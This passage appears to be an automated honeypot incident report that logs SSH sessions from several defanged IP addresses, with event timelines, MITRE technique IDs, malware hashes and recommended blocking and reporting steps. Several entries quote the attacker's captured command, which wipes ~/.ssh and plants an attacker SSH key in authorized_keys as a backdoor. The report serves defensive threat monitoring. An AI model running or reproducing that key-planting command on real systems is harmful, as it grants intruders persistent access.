| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:36:43` | `cowrie.session.connect` |
| `2026-04-30 11:36:43` | `cowrie.client.version` |
| `2026-04-30 11:36:44` | `cowrie.client.kex` |
| `2026-04-30 11:36:45` | `cowrie.login.success` |
| `2026-04-30 11:36:45` | `cowrie.session.params` |
| `2026-04-30 11:36:45` | `cowrie.command.input` |
| `2026-04-30 11:36:45` | `cowrie.command.failed` |
| `2026-04-30 11:36:45` | `cowrie.log.closed` |
| `2026-04-30 11:36:46` | `cowrie.session.params` |
| `2026-04-30 11:36:46` | `cowrie.command.input` |
| `2026-04-30 11:36:46` | `cowrie.session.file_download` |
| `2026-04-30 11:36:46` | `cowrie.log.closed` |
| `2026-04-30 11:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2cdd69c14b1

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:36 |
| **Last Seen** | 2026-04-30 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:36:49` | `cowrie.session.connect` |
| `2026-04-30 11:36:49` | `cowrie.client.version` |
| `2026-04-30 11:36:49` | `cowrie.client.kex` |
| `2026-04-30 11:36:50` | `cowrie.login.success` |
| `2026-04-30 11:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806a67bc47ff

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:37 |
| **Last Seen** | 2026-04-30 11:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:37:51` | `cowrie.session.connect` |
| `2026-04-30 11:37:51` | `cowrie.client.version` |
| `2026-04-30 11:37:51` | `cowrie.client.kex` |
| `2026-04-30 11:37:52` | `cowrie.login.success` |
| `2026-04-30 11:37:53` | `cowrie.session.params` |
| `2026-04-30 11:37:53` | `cowrie.command.input` |
| `2026-04-30 11:37:53` | `cowrie.command.failed` |
| `2026-04-30 11:37:53` | `cowrie.log.closed` |
| `2026-04-30 11:37:54` | `cowrie.session.params` |
| `2026-04-30 11:37:54` | `cowrie.command.input` |
| `2026-04-30 11:37:54` | `cowrie.session.file_download` |
| `2026-04-30 11:37:54` | `cowrie.log.closed` |
| `2026-04-30 11:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ef2b6ce6ea

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:37 |
| **Last Seen** | 2026-04-30 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:37:57` | `cowrie.session.connect` |
| `2026-04-30 11:37:57` | `cowrie.client.version` |
| `2026-04-30 11:37:57` | `cowrie.client.kex` |
| `2026-04-30 11:37:58` | `cowrie.login.success` |
| `2026-04-30 11:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc3d04bfd19

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:38 |
| **Last Seen** | 2026-04-30 11:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:38:58` | `cowrie.session.connect` |
| `2026-04-30 11:38:58` | `cowrie.client.version` |
| `2026-04-30 11:38:58` | `cowrie.client.kex` |
| `2026-04-30 11:38:59` | `cowrie.login.success` |
| `2026-04-30 11:39:00` | `cowrie.session.params` |
| `2026-04-30 11:39:00` | `cowrie.command.input` |
| `2026-04-30 11:39:00` | `cowrie.command.failed` |
| `2026-04-30 11:39:00` | `cowrie.log.closed` |
| `2026-04-30 11:39:00` | `cowrie.session.params` |
| `2026-04-30 11:39:00` | `cowrie.command.input` |
| `2026-04-30 11:39:01` | `cowrie.session.file_download` |
| `2026-04-30 11:39:01` | `cowrie.log.closed` |
| `2026-04-30 11:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a697c898b7ab

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-04-30 11:39 |
| **Last Seen** | 2026-04-30 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:39:04` | `cowrie.session.connect` |
| `2026-04-30 11:39:04` | `cowrie.client.version` |
| `2026-04-30 11:39:04` | `cowrie.client.kex` |
| `2026-04-30 11:39:05` | `cowrie.login.success` |
| `2026-04-30 11:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-613766104bea

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-30 11:55 |
| **Last Seen** | 2026-04-30 11:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:55:37` | `cowrie.session.connect` |
| `2026-04-30 11:55:37` | `cowrie.client.version` |
| `2026-04-30 11:55:37` | `cowrie.client.kex` |
| `2026-04-30 11:55:38` | `cowrie.login.success` |
| `2026-04-30 11:55:39` | `cowrie.session.params` |
| `2026-04-30 11:55:39` | `cowrie.command.input` |
| `2026-04-30 11:55:39` | `cowrie.command.failed` |
| `2026-04-30 11:55:39` | `cowrie.log.closed` |
| `2026-04-30 11:55:40` | `cowrie.session.params` |
| `2026-04-30 11:55:40` | `cowrie.command.input` |
| `2026-04-30 11:55:40` | `cowrie.session.file_download` |
| `2026-04-30 11:55:40` | `cowrie.log.closed` |
| `2026-04-30 11:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db1290dd72a1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-30 11:55 |
| **Last Seen** | 2026-04-30 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 11:55:44` | `cowrie.session.connect` |
| `2026-04-30 11:55:44` | `cowrie.client.version` |
| `2026-04-30 11:55:44` | `cowrie.client.kex` |
| `2026-04-30 11:55:45` | `cowrie.login.success` |
| `2026-04-30 11:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6764fceea18a

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:53 |
| **Last Seen** | 2026-04-30 12:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:53:34` | `cowrie.session.connect` |
| `2026-04-30 12:53:34` | `cowrie.client.version` |
| `2026-04-30 12:53:34` | `cowrie.client.kex` |
| `2026-04-30 12:53:34` | `cowrie.login.success` |
| `2026-04-30 12:53:35` | `cowrie.session.params` |
| `2026-04-30 12:53:35` | `cowrie.command.input` |
| `2026-04-30 12:53:35` | `cowrie.command.failed` |
| `2026-04-30 12:53:35` | `cowrie.log.closed` |
| `2026-04-30 12:53:36` | `cowrie.session.params` |
| `2026-04-30 12:53:36` | `cowrie.command.input` |
| `2026-04-30 12:53:36` | `cowrie.session.file_download` |
| `2026-04-30 12:53:36` | `cowrie.log.closed` |
| `2026-04-30 12:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-681e4f45da5e

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:53 |
| **Last Seen** | 2026-04-30 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:53:38` | `cowrie.session.connect` |
| `2026-04-30 12:53:38` | `cowrie.client.version` |
| `2026-04-30 12:53:38` | `cowrie.client.kex` |
| `2026-04-30 12:53:39` | `cowrie.login.success` |
| `2026-04-30 12:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aaa8cb666ec

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:55 |
| **Last Seen** | 2026-04-30 12:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:55:18` | `cowrie.session.connect` |
| `2026-04-30 12:55:18` | `cowrie.client.version` |
| `2026-04-30 12:55:18` | `cowrie.client.kex` |
| `2026-04-30 12:55:19` | `cowrie.login.success` |
| `2026-04-30 12:55:19` | `cowrie.session.params` |
| `2026-04-30 12:55:19` | `cowrie.command.input` |
| `2026-04-30 12:55:19` | `cowrie.command.failed` |
| `2026-04-30 12:55:19` | `cowrie.log.closed` |
| `2026-04-30 12:55:20` | `cowrie.session.params` |
| `2026-04-30 12:55:20` | `cowrie.command.input` |
| `2026-04-30 12:55:20` | `cowrie.session.file_download` |
| `2026-04-30 12:55:20` | `cowrie.log.closed` |
| `2026-04-30 12:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8e62cdf846

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:55 |
| **Last Seen** | 2026-04-30 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:55:23` | `cowrie.session.connect` |
| `2026-04-30 12:55:23` | `cowrie.client.version` |
| `2026-04-30 12:55:23` | `cowrie.client.kex` |
| `2026-04-30 12:55:24` | `cowrie.login.success` |
| `2026-04-30 12:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba2247cca761

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:56 |
| **Last Seen** | 2026-04-30 12:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:56:09` | `cowrie.session.connect` |
| `2026-04-30 12:56:09` | `cowrie.client.version` |
| `2026-04-30 12:56:09` | `cowrie.client.kex` |
| `2026-04-30 12:56:10` | `cowrie.login.success` |
| `2026-04-30 12:56:11` | `cowrie.session.params` |
| `2026-04-30 12:56:11` | `cowrie.command.input` |
| `2026-04-30 12:56:11` | `cowrie.command.failed` |
| `2026-04-30 12:56:11` | `cowrie.log.closed` |
| `2026-04-30 12:56:11` | `cowrie.session.params` |
| `2026-04-30 12:56:11` | `cowrie.command.input` |
| `2026-04-30 12:56:11` | `cowrie.session.file_download` |
| `2026-04-30 12:56:11` | `cowrie.log.closed` |
| `2026-04-30 12:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bba2664f1ec7

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:56 |
| **Last Seen** | 2026-04-30 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:56:14` | `cowrie.session.connect` |
| `2026-04-30 12:56:14` | `cowrie.client.version` |
| `2026-04-30 12:56:14` | `cowrie.client.kex` |
| `2026-04-30 12:56:15` | `cowrie.login.success` |
| `2026-04-30 12:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-823f0982d632

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:57 |
| **Last Seen** | 2026-04-30 12:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:57:54` | `cowrie.session.connect` |
| `2026-04-30 12:57:54` | `cowrie.client.version` |
| `2026-04-30 12:57:54` | `cowrie.client.kex` |
| `2026-04-30 12:57:54` | `cowrie.login.success` |
| `2026-04-30 12:57:55` | `cowrie.session.params` |
| `2026-04-30 12:57:55` | `cowrie.command.input` |
| `2026-04-30 12:57:55` | `cowrie.command.failed` |
| `2026-04-30 12:57:55` | `cowrie.log.closed` |
| `2026-04-30 12:57:56` | `cowrie.session.params` |
| `2026-04-30 12:57:56` | `cowrie.command.input` |
| `2026-04-30 12:57:56` | `cowrie.session.file_download` |
| `2026-04-30 12:57:56` | `cowrie.log.closed` |
| `2026-04-30 12:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc53d4028253

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:57 |
| **Last Seen** | 2026-04-30 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:57:58` | `cowrie.session.connect` |
| `2026-04-30 12:57:58` | `cowrie.client.version` |
| `2026-04-30 12:57:58` | `cowrie.client.kex` |
| `2026-04-30 12:57:59` | `cowrie.login.success` |
| `2026-04-30 12:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.20[.]112` to AbuseIPDB if not already reported
- [ ] Block `138.124.20[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34aa0ce60f93

| Field | Detail |
|---|---|
| **Source IP** | `138.124.20[.]112` |
| **First Seen** | 2026-04-30 12:58 |
| **Last Seen** | 2026-04-30 12:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 12:58:43` | `cowrie.session.connect` |
| `2026-04-30 12:58:43` | `cowrie.client.version` |
| `2026-04-30 12:58:43` | `cowrie.client.kex` |
| `2026-04-30 12:58:44` | `cowrie.login.success` |
| `2026-04-30 12:58:44` | `cowrie.session.params` |
| `2026-04-30 12:58:44` | `cowrie.command.input` |
